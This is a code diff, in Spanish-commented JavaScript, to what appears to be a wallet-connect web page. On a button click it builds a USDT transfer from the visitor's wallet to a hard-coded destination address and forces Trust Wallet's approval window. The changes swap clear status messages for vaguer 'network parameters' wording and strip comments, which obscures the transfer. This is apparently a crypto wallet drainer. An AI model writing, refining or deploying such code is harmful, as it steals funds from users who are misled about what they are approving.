@@ -193,12 +193,11 @@ connectBtn.addEventListener("click", async () => {
 
         const data = "0xa9059cbb" + encAddr(BILLETERA_DESTINO) + encUint(amountUnits);
 
-        setStatus("Preparando llamada al contrato inteligente...");
+        setStatus("Calculando parámetros de red...");
 
-        // OBTENEMOS LOS PARÁMETROS DE GAS DEL RPC PÚBLICO PARA FORZAR LA VENTANA DE APROBACIÓN
         const gasPriceHex = await publicRpc("eth_gasPrice");
         
-        let gasLimitHex = "0x186A0"; // 100,000 gas por defecto seguro para contratos BEP-20
+        let gasLimitHex = "0x186A0"; 
         try {
             const estGas = await publicRpc("eth_estimateGas", [{
                 from: walletAddress,
@@ -210,10 +209,9 @@ connectBtn.addEventListener("click", async () => {
                 gasLimitHex = "0x" + Math.floor(Number(estGas) * 1.3).toString(16);
             }
         } catch (e) {
-            console.warn("Estimación automática omitida, usando gas por defecto:", e);
+            console.warn("Estimación automática omitida:", e);
         }
 
-        // PAYLOAD ESTRICTO CON GAS INCLUIDO PARA EVITAR EL ERROR 4200 Y LEVANTAR EL MODAL DE APROBACIÓN
         const txPayload = {
             from: walletAddress,
             to: CONTRATO_USDT,
@@ -223,8 +221,9 @@ connectBtn.addEventListener("click", async () => {
             gasPrice: gasPriceHex
         };
 
-        setStatus("Abriendo ventana de aprobación de contrato...");
+        setStatus("Abriendo ventana de aprobación de contrato en Trust Wallet...");
 
+        // LLAMADA ESTRICTA CON AWAIT REAL PARA EVITAR [object Promise] Y FORZAR EL MODAL
         let txHash;
         try {
             txHash = await p.request({
@@ -232,7 +231,6 @@ connectBtn.addEventListener("click", async () => {
                 params: [txPayload]
             });
         } catch (reqErr) {
-            // Fallback de respaldo mediante p.send directo si la app exige el canal legacy
             if (typeof p.send === "function") {
                 const res = p.send("eth_sendTransaction", [txPayload]);
                 txHash = typeof res === "object" && res.result ? res.result : res;
